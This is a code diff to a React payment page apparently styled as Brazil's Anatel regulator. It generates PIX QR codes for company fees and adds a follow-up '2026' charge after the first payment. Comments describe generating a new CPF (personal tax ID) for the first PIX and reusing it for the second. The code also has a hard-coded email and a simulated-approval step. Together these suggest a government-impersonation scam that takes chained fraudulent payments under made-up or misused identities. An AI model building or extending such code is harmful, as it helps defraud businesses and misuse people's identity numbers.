@@ -39,23 +39,40 @@ const AnatelPagamentoPage = () => {
 
     setDadosEmpresa(dados);
     setTaxas(taxasData);
-    gerarPix(dados, taxasData);
+    
+    // Se for exercício 2026 (vindo da confirmação), usar CPF anterior
+    const cpfAnterior = location.state?.cpfAnterior;
+    gerarPix(dados, taxasData, cpfAnterior);
   }, []);
 
-  const gerarPix = async (empresa, taxasData) => {
+  const gerarPix = async (empresa, taxasData, cpfAnterior = null) => {
     setLoading(true);
 
     try {
-      const response = await axios.post(`${API}/pagamento/pix`, {
-        cnpj: empresa.cnpj,
-        nome: empresa.nome,
-        email: 'contato@empresa.com',
-        valor: taxasData.total
-      });
+      let response;
+      
+      if (cpfAnterior) {
+        // PIX 2026 - usar mesmo CPF do primeiro pagamento
+        response = await axios.post(`${API}/pagamento/pix-2026`, {
+          cnpj: empresa.cnpj,
+          nome: empresa.nome,
+          email: 'contato@empresa.com',
+          valor: taxasData.total,
+          cpf_anterior: cpfAnterior
+        });
+      } else {
+        // Primeiro PIX - gerar novo CPF
+        response = await axios.post(`${API}/pagamento/pix`, {
+          cnpj: empresa.cnpj,
+          nome: empresa.nome,
+          email: 'contato@empresa.com',
+          valor: taxasData.total
+        });
+      }
 
       setPagamento(response.data);
       toast.success('QR Code PIX gerado com sucesso!');
-      iniciarMonitoramento(response.data.id);
+      iniciarMonitoramento(response.data.id, response.data.cpf_utilizado);
     } catch (error) {
       console.error('Erro ao gerar PIX:', error);
       toast.error('Erro ao gerar PIX. Tente novamente.');
@@ -72,15 +89,29 @@ const AnatelPagamentoPage = () => {
       await axios.post(`${API}/pagamento/simular-aprovacao/${pagamento.id}`);
       toast.success('Pagamento simulado como aprovado!');
       
-      // Redirecionar para confirmação
+      const isExercicio2026 = location.state?.exercicio2026;
+      
+      // Redirecionar para confirmação ou página final
       setTimeout(() => {
-        navigate('/anatel/confirmacao', {
-          state: {
-            valor: taxas.total,
-            cnpj: dadosEmpresa.cnpj,
-            dadosEmpresa: dadosEmpresa
-          }
-        });
+        if (isExercicio2026) {
+          // Após pagar 2026, vai para página final (em dia)
+          navigate('/anatel/em-dia', {
+            state: {
+              cnpj: dadosEmpresa.cnpj,
+              dadosEmpresa: dadosEmpresa
+            }
+          });
+        } else {
+          // Após pagar 2025, vai para confirmação (com opção 2026)
+          navigate('/anatel/confirmacao', {
+            state: {
+              valor: taxas.total,
+              cnpj: dadosEmpresa.cnpj,
+              dadosEmpresa: dadosEmpresa,
+              cpfUtilizado: pagamento.cpf_utilizado
+            }
+          });
+        }
       }, 1000);
     } catch (error) {
       console.error('Erro ao simular aprovação:', error);
@@ -88,7 +119,7 @@ const AnatelPagamentoPage = () => {
     }
   };
 
-  const iniciarMonitoramento = (transactionId) => {
+  const iniciarMonitoramento = (transactionId, cpfUtilizado) => {
     const interval = setInterval(async () => {
       try {
         const response = await axios.get(`${API}/pagamento/status/${transactionId}`);
